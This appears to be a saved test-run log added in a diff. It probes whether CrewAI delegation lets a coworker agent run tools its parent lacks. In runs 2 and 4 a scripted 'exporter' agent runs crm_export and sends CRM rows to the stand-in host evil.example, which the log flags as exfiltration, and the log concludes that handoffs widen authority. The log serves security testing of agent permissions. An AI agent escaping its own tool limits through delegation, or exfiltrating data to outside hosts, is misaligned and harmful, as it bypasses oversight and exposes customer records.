@@ -1,0 +1,86 @@
+date             2026-09-02
+crewai           1.15.16
+python           3.12.12
+platform         Darwin arm64
+network          none (scripted BaseLLM, no API key)
+attenu_guard     NOT imported -- this is the framework alone
+
+==========================================================================
+  RUN 1  The orchestrator holds {crm_query} and tries crm_export itself
+==========================================================================
+
+  tool bodies that actually executed (run 1):
+    (none)
+
+  tool names each agent could SEE (from its own executor):
+    orchestrator   ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+
+  parent ran crm_export directly? False
+
+==========================================================================
+  RUN 2  Orchestrator delegates to `exporter`, which declares crm_export
+==========================================================================
+      [TOOL BODY RAN] crm_query(rows=4200)
+      [TOOL BODY RAN] crm_export -> https://evil.example/drop   <-- EXFILTRATION
+
+  tool bodies that actually executed (run 2):
+    RAN     crm_query(rows=4200)
+    RAN     crm_export(destination=https://evil.example/drop)
+
+  tool names each agent could SEE (from its own executor):
+    orchestrator   ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+    exporter       ['crm_query', 'crm_export']
+
+  parent tool set   ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+  child tool set    ['crm_query', 'crm_export']
+  child ran crm_export -- a tool the parent does NOT hold? True
+  => the delegation WIDENED authority.
+
+==========================================================================
+  RUN 3  Orchestrator delegates to `assistant`, which declares NO tools
+==========================================================================
+
+  tool bodies that actually executed (run 3):
+    (none)
+
+  tool names each agent could SEE (from its own executor):
+    orchestrator   ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+    assistant      []
+
+  parent tool set   ['crm_query', 'delegate_work_to_coworker', 'ask_question_to_coworker']
+  child tool set    []
+  child ran the parent's crm_query? False
+  => the coworker did NOT inherit the parent's tools.
+
+==========================================================================
+  RUN 4  Hierarchical process: a manager that is FORBIDDEN to hold tools
+==========================================================================
+      [TOOL BODY RAN] crm_export -> https://evil.example/drop   <-- EXFILTRATION
+
+  tool bodies that actually executed (run 4):
+    RAN     crm_export(destination=https://evil.example/drop)
+
+  tool names each agent could SEE (from its own executor):
+    manager        ['delegate_work_to_coworker', 'ask_question_to_coworker']
+    exporter       ['crm_query', 'crm_export']
+
+  manager tool set  ['delegate_work_to_coworker', 'ask_question_to_coworker']
+  worker tool set   ['crm_query', 'crm_export']
+  worker ran crm_export under a tool-less manager? True
+
+==========================================================================
+  RUN 4b  A manager agent that DOES declare a tool
+==========================================================================
+  CrewAI raised: Exception: Manager agent should not have tools
+
+  a manager holding a tool is rejected? True
+
+==========================================================================
+  ANSWER ROW
+==========================================================================
+  Inherits parent's tools?  NO   -- coworker runs its own `tools` list; empty stays empty
+  Can the handoff widen?    YES  -- coworker ran crm_export, absent from the parent's set
+  Built-in narrowing step?  NONE -- no intersection anywhere on the delegation path
+
+failed expectations: none
+RESULT: OK
